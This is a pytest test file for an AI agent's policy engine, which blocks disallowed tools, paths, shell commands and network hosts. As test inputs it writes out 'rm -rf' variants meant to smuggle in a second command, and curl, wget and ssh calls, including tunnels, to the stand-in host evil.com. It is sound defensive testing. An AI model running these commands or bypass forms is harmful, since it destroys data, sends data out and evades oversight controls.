"""Tests for profile policy engine enforcement."""

from __future__ import annotations

from pathlib import Path

import pytest

from afkbot.models.profile_policy import ProfilePolicy
from afkbot.services.policy import PolicyEngine, PolicyViolationError


def _policy(**overrides: object) -> ProfilePolicy:
    values: dict[str, object] = {
        "profile_id": "p1",
        "policy_enabled": True,
        "policy_preset": "medium",
        "policy_capabilities_json": "[]",
        "max_iterations_main": 8,
        "max_iterations_subagent": 6,
        "allowed_tools_json": "[]",
        "denied_tools_json": "[]",
        "allowed_directories_json": "[]",
        "shell_allowed_commands_json": "[]",
        "shell_denied_commands_json": "[]",
        "network_allowlist_json": "[]",
    }
    values.update(overrides)
    return ProfilePolicy(**values)


def test_policy_engine_enforces_tool_allow_and_deny() -> None:
    """Tool policy checks should deny explicit denied and non-allowed calls."""

    engine = PolicyEngine()

    denied_policy = _policy(denied_tools_json='["debug.echo"]')
    with pytest.raises(PolicyViolationError, match="Tool is denied by policy: debug.echo"):
        engine.ensure_tool_call_allowed(
            policy=denied_policy,
            tool_name="debug.echo",
            params={},
        )

    allowed_policy = _policy(allowed_tools_json='["memory.search"]')
    with pytest.raises(PolicyViolationError, match="Tool is not allowed by policy: debug.echo"):
        engine.ensure_tool_call_allowed(
            policy=allowed_policy,
            tool_name="debug.echo",
            params={},
        )


def test_policy_engine_matches_wildcard_tool_rules() -> None:
    """Wildcard allow/deny rules should match dynamic runtime tool prefixes."""

    # Arrange
    engine = PolicyEngine()
    allow_policy = _policy(allowed_tools_json='["mcp.*"]')
    deny_policy = _policy(denied_tools_json='["mcp.github.*"]')

    # Act
    engine.ensure_tool_call_allowed(
        policy=allow_policy,
        tool_name="mcp.github.search_issues",
        params={},
    )

    # Assert
    with pytest.raises(
        PolicyViolationError,
        match="Tool is denied by policy: mcp.github.search_issues",
    ):
        engine.ensure_tool_call_allowed(
            policy=deny_policy,
            tool_name="mcp.github.search_issues",
            params={},
        )


def test_policy_engine_fail_closed_on_invalid_json() -> None:
    """Invalid list JSON should fail closed with profile policy violation."""

    engine = PolicyEngine()
    policy = _policy(allowed_tools_json="{invalid-json")

    with pytest.raises(
        PolicyViolationError,
        match="Profile policy allowed_tools_json is invalid JSON list",
    ):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={},
        )


def test_policy_engine_enforces_directory_shell_and_network_fields(tmp_path: Path) -> None:
    """Path, shell and network fields should be enforced when present in params."""

    allow_dir = (tmp_path / "allowed").resolve()
    allow_dir.mkdir(parents=True)
    policy = _policy(
        allowed_directories_json=f'["{allow_dir}"]',
        shell_allowed_commands_json='["ls"]',
        shell_denied_commands_json='["rm"]',
        network_allowlist_json='["example.com"]',
    )
    engine = PolicyEngine(root_dir=tmp_path)

    allowed_params: dict[str, object] = {
        "cwd": str(allow_dir / "nested"),
        "cmd": "ls -la",
        "url": "https://api.example.com/v1",
    }
    engine.ensure_tool_call_allowed(
        policy=policy,
        tool_name="debug.echo",
        params=allowed_params,
    )

    with pytest.raises(PolicyViolationError, match="Path is not allowed by policy"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"path": str(tmp_path / "outside" / "x.txt")},
        )

    with pytest.raises(PolicyViolationError, match="Shell command is denied by policy: rm"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"cmd": "rm -rf /tmp"},
        )
    with pytest.raises(PolicyViolationError, match="Shell command is denied by policy: rm"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"cmd": "X=1 rm -rf /tmp"},
        )
    with pytest.raises(PolicyViolationError, match="Shell command is denied by policy: rm"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"cmd": "env rm -rf /tmp"},
        )
    with pytest.raises(PolicyViolationError, match="Shell command is denied by policy: rm"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"cmd": "echo ok; rm -rf /tmp"},
        )
    with pytest.raises(PolicyViolationError, match="Shell command is denied by policy: rm"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"cmd": "echo ok && rm -rf /tmp"},
        )
    with pytest.raises(PolicyViolationError, match="Shell command is denied by policy: rm"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"cmd": "bash -c 'rm -rf /tmp'"},
        )
    with pytest.raises(PolicyViolationError, match="Shell command is denied by policy: rm"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="bash.exec",
            params={"session_id": "session-1", "chars": "rm -rf /tmp\n"},
        )
    with pytest.raises(PolicyViolationError, match="Shell command substitution is not allowed by policy"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"cmd": "ls $(rm -rf /tmp)"},
        )
    with pytest.raises(PolicyViolationError, match="Shell command substitution is not allowed by policy"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"cmd": "ls `rm -rf /tmp`"},
        )

    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"url": "https://evil.com/path"},
        )
    network_shell_policy = _policy(
        shell_allowed_commands_json='["curl","wget","ping"]',
        network_allowlist_json='["example.com"]',
    )
    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
        engine.ensure_tool_call_allowed(
            policy=network_shell_policy,
            tool_name="debug.echo",
            params={"cmd": "curl evil.com"},
        )
    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
        engine.ensure_tool_call_allowed(
            policy=network_shell_policy,
            tool_name="debug.echo",
            params={"cmd": "wget evil.com"},
        )
    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
        engine.ensure_tool_call_allowed(
            policy=network_shell_policy,
            tool_name="debug.echo",
            params={"cmd": "ping evil.com"},
        )


def test_policy_engine_enforces_allowlist_for_absolute_paths_in_file_tools(tmp_path: Path) -> None:
    """Directory allowlist should also apply to absolute file.* paths."""

    allow_dir = (tmp_path / "allowed").resolve()
    outside_path = (tmp_path / "outside" / "x.txt").resolve()
    allow_dir.mkdir(parents=True)
    policy = _policy(allowed_directories_json=f'["{allow_dir}"]')
    engine = PolicyEngine(root_dir=tmp_path)

    with pytest.raises(PolicyViolationError, match="Path is not allowed by policy"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="file.read",
            params={"path": str(outside_path)},
        )

    with pytest.raises(PolicyViolationError, match="Path is not allowed by policy"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"path": str(outside_path)},
        )

    with pytest.raises(PolicyViolationError, match="Path is not allowed by policy"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="file.read",
            params={"path": "outside/x.txt"},
        )


def test_policy_engine_network_is_fail_closed_when_allowlist_empty() -> None:
    """Network params should be denied when policy is enabled and allowlist is empty."""

    engine = PolicyEngine()
    policy = _policy(network_allowlist_json="[]")

    with pytest.raises(
        PolicyViolationError,
        match="network_allowlist_json is empty",
    ):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="debug.echo",
            params={"url": "https://example.com/resource"},
        )


def test_policy_engine_network_wildcard_allows_any_host() -> None:
    """Wildcard allowlist should behave as unrestricted outbound network access."""

    engine = PolicyEngine()
    policy = _policy(network_allowlist_json='["*"]')

    engine.ensure_tool_call_allowed(
        policy=policy,
        tool_name="http.request",
        params={"url": "https://afkbot.io"},
    )
    engine.ensure_tool_call_allowed(
        policy=policy,
        tool_name="bash.exec",
        params={"cmd": "curl https://example.com"},
    )


def test_policy_engine_web_search_is_fail_closed_when_allowlist_empty() -> None:
    """web.search should also be denied when policy allowlist is empty."""

    engine = PolicyEngine()
    policy = _policy(network_allowlist_json="[]")

    with pytest.raises(
        PolicyViolationError,
        match="network_allowlist_json is empty",
    ):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="web.search",
            params={},
        )


def test_policy_engine_web_search_uses_fixed_provider_host_allowlist() -> None:
    """web.search should honor allowlist against Brave API outbound host."""

    engine = PolicyEngine()
    denied_policy = _policy(network_allowlist_json='["example.com"]')
    with pytest.raises(
        PolicyViolationError,
        match="Network host is not allowed by policy: api.search.brave.com",
    ):
        engine.ensure_tool_call_allowed(
            policy=denied_policy,
            tool_name="web.search",
            params={},
        )

    allowed_policy = _policy(network_allowlist_json='["search.brave.com"]')
    engine.ensure_tool_call_allowed(
        policy=allowed_policy,
        tool_name="web.search",
        params={},
    )


def test_policy_engine_enforces_network_allowlist_for_shell_command_urls() -> None:
    """Network allowlist should also apply to URL hosts found inside shell commands."""

    engine = PolicyEngine()
    policy = _policy(network_allowlist_json='["example.com"]')

    engine.ensure_tool_call_allowed(
        policy=policy,
        tool_name="bash.exec",
        params={"cmd": "curl https://api.example.com/v1"},
    )

    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="bash.exec",
            params={"cmd": "curl https://evil.com/leak"},
        )


def test_policy_engine_enforces_network_allowlist_for_shell_ssh_hosts() -> None:
    """Network allowlist should apply to SSH hosts found inside shell commands."""

    # Arrange
    engine = PolicyEngine()
    policy = _policy(network_allowlist_json='["example.com"]')

    # Act
    engine.ensure_tool_call_allowed(
        policy=policy,
        tool_name="bash.exec",
        params={"cmd": "ssh deploy@example.com"},
    )

    # Assert
    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="bash.exec",
            params={"cmd": "ssh root@evil.com"},
        )


def test_policy_engine_enforces_network_allowlist_for_ssh_jump_hosts() -> None:
    """SSH jump hosts should be validated against the network allowlist."""

    # Arrange
    engine = PolicyEngine()
    policy = _policy(network_allowlist_json='["example.com"]')

    # Act
    # Assert
    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="bash.exec",
            params={"cmd": "ssh -J evil.com deploy@example.com"},
        )


def test_policy_engine_enforces_network_allowlist_for_ssh_jump_host_chains() -> None:
    """SSH jump host chains should validate each hop against the network allowlist."""

    # Arrange
    engine = PolicyEngine()
    policy = _policy(network_allowlist_json='["example.com"]')

    # Act
    # Assert
    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="bash.exec",
            params={"cmd": "ssh -J evil.com,bastion.example.com deploy@example.com"},
        )


def test_policy_engine_enforces_network_allowlist_for_ssh_stdio_forward_targets() -> None:
    """SSH stdio forwarding targets should be validated against the network allowlist."""

    # Arrange
    engine = PolicyEngine()
    policy = _policy(network_allowlist_json='["example.com"]')

    # Act
    # Assert
    with pytest.raises(
        PolicyViolationError,
        match="Network host is not allowed by policy: evil.internal",
    ):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="bash.exec",
            params={"cmd": "ssh -W evil.internal:22 bastion.example.com"},
        )


def test_policy_engine_enforces_network_allowlist_for_ssh_local_port_forward_targets() -> None:
    """SSH local port forwarding targets should be validated against the network allowlist."""

    # Arrange
    engine = PolicyEngine()
    policy = _policy(network_allowlist_json='["example.com"]')

    # Act
    # Assert
    with pytest.raises(
        PolicyViolationError,
        match="Network host is not allowed by policy: evil.internal",
    ):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="bash.exec",
            params={"cmd": "ssh -L 8080:evil.internal:80 bastion.example.com"},
        )


def test_policy_engine_enforces_network_allowlist_for_ssh_remote_port_forward_targets() -> None:
    """SSH remote port forwarding targets should be validated against the network allowlist."""

    # Arrange
    engine = PolicyEngine()
    policy = _policy(network_allowlist_json='["example.com"]')

    # Act
    # Assert
    with pytest.raises(
        PolicyViolationError,
        match="Network host is not allowed by policy: evil.internal",
    ):
        engine.ensure_tool_call_allowed(
            policy=policy,
            tool_name="bash.exec",
            params={"cmd": "ssh -R 9090:evil.internal:80 bastion.example.com"},
        )


def test_policy_engine_iteration_limits_and_subagent_gate() -> None:
    """Iteration limits should be policy-capped and subagent gate should honor zero limit."""

    engine = PolicyEngine()
    policy = _policy(max_iterations_main=2, max_iterations_subagent=0)

    assert engine.effective_main_iterations(policy=policy, runtime_limit=5) == 2

    with pytest.raises(PolicyViolationError, match="max_iterations_subagent <= 0"):
        engine.ensure_subagent_run_allowed(policy=policy)


def test_policy_engine_does_not_treat_profile_fields_as_paths(tmp_path: Path) -> None:
    """Profile identity fields should not trigger allowed_directories checks."""

    allow_dir = (tmp_path / "allowed").resolve()
    allow_dir.mkdir(parents=True)
    policy = _policy(allowed_directories_json=f'["{allow_dir}"]')
    engine = PolicyEngine(root_dir=tmp_path)

    engine.ensure_tool_call_allowed(
        policy=policy,
        tool_name="debug.echo",
        params={"profile_key": "default", "profile_id": "p1"},
    )


def test_policy_engine_disabled_mode_bypasses_enforcement(tmp_path: Path) -> None:
    """Disabled policy should bypass tool/iteration/subagent checks."""

    policy = _policy(
        policy_enabled=False,
        max_iterations_main=1,
        max_iterations_subagent=0,
        allowed_tools_json='["memory.search"]',
        denied_tools_json='["debug.echo"]',
    )
    engine = PolicyEngine(root_dir=tmp_path)

    assert engine.effective_main_iterations(policy=policy, runtime_limit=9) == 9
    engine.ensure_subagent_run_allowed(policy=policy)
    engine.ensure_tool_call_allowed(
        policy=policy,
        tool_name="debug.echo",
        params={},
    )
